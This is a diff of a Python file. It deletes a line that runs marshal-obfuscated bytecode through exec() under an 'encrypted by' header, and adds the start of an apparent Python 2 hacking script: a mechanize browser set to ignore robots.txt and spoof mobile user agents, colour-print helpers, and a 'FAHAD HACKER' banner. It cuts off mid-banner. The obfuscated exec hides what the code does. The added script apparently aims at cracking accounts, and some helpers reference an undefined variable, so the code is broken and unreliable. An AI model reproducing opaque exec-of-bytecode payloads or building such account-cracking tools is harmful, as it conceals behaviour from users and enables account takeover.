@@ -1,9 +1,92 @@
-#ENCRYPTED BY  : MUHAMMAD HAMID KHAWAJA
 
-#ENCRYPTION    : Py3 MARSHAL
+_import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
 
-#Py3 Version   : 3.10.4
+from multiprocessing.pool import ThreadPool
 
-import marshal
+from requests.exceptions import ConnectionError
 
-exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\x00\x00\x00@\x00\x00\x00s\xbc\x02\x00\x00d\x00d\x01l\x00Z\x00z\x06d\x00d\x01l\x01Z\x01W\x00n\x12\x04\x00e\x02y\x1c\x01\x00\x01\x00\x01\x00e\x03d\x02\x83\x01\x01\x00e\x00\xa0\x04d\x03\xa1\x01\x01\x00Y\x00n\x01w\x00z\x06d\x00d\x01l\x05Z\x06W\x00n\x12\x04\x00e\x02y5\x01\x00\x01\x00\x01\x00e\x03d\x04\x83\x01\x01\x00e\x00\xa0\x04d\x05\xa1\x01\x01\x00Y\x00n\x01w\x00z\x06d\x00d\x01l\x07Z\x07W\x00n\x12\x04\x00e\x02yN\x01\x00\x01\x00\x01\x00e\x03d\x06\x83\x01\x01\x00e\x00\xa0\x04d\x07\xa1\x01\x01\x00Y\x00n\x01w\x00d\x00d\x01l\x01Z\x01d\x00d\x01l\x00Z\x00d\x00d\x01l\x08Z\x08d\x00d\x01l\x07Z\x07d\x00d\x01l\tZ\td\x00d\x01l\nZ\nd\x00d\x01l\x0bZ\x0bd\x00d\x01l\x0cZ\x0cd\x00d\x01l\rZ\rd\x00d\x01l\x0eZ\x0ed\x00d\x01l\x0fZ\x0fd\x00d\x01l\x10Z\x10d\x00d\x01l\x11Z\x11d\x00d\x01l\x12Z\x12d\x00d\x01l\x13Z\x13d\x00d\x01l\x14Z\x14d\x00d\x08l\x05m\x15Z\x16\x01\x00d\x00d\tl\x0em\x0eZ\x0e\x01\x00d\x00d\nl\x07m\x17Z\x17\x01\x00e\x0e\xa0\x18\xa1\x00Z\x19e\x19j\x1aZ\x1bg\x00d\x0b\xa2\x01Z\x1cz\x11e\x1bd\x00k\x00s\xb5e\x1bd\x0ck\x04r\xb8e\x1d\x83\x00\x01\x00e\x1bd\r\x18\x00Z\x1eW\x00n\x0c\x04\x00e\x1fy\xc9\x01\x00\x01\x00\x01\x00e\x1d\x83\x00\x01\x00Y\x00n\x01w\x00e\x0e\xa0\x18\xa1\x00Z e j!Z"e j\x1aZ#e j$Z%e\x1ce\x1e\x19\x00Z&d\x0eZ\'d\x0fZ(d\x10Z)d\x0eZ*d\x0eZ+d\x0eZ,d\x0eZ-d\x11Z.e\'e(e)e*e+e,e-e.g\x08Z/
+from mechanize import Browser
+
+reload(sys)
+
+sys.setdefaultencoding('utf8')
+
+ 
+
+br = mechanize.Browser()
+
+br.set_handle_robots(False)
+
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+
+br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 8.1.0; Chrome/79.0.3945.116) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36')]
+
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+
+def keluar():
+
+	print "\033[1;96m[!] \x1b[1;91mExit"
+
+	os.sys.exit()
+
+def acak(b):
+
+    w = 'ahtdzjc'
+
+    d = ''
+
+    for i in x:
+
+        d += '!'+w[random.randint(0,len(w)-1)]+i
+
+    return cetak(d)
+
+def cetak(b):
+
+    w = 'ahtdzjc'
+
+    for i in w:
+
+        j = w.index(i)
+
+        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
+
+    x += '\033[0m'
+
+    x = x.replace('!0','\033[0m')
+
+    sys.stdout.write(x+'\n')
+
+def jalan(z):
+
+	for e in z + '\n':
+
+		sys.stdout.write(e)
+
+		sys.stdout.flush()
+
+		time.sleep(00000.1)
+
+##### LOGO #####
+
+logo = """
+
+   FAHAD HACKER
+
+   ▄︻̷̿┻̿═━一
+
+   THE ANONYMOUS lovehacker TRICKER 
+
+   THE LEGEND ℒℴνℯ
+
+   THE GAME CHANGER ℒℴνℯ
+
+   pakistani hackers
+
+   ℒℴνℯ ▄︻̷̿┻̿═━一
+
+\033[1;91m=======================================
+
+\033[1;96mAuthor  \033[1;93m: \033[1;92mlove
+
+\033[1;96mYouTube \033[1;93m: \033[1;92mP
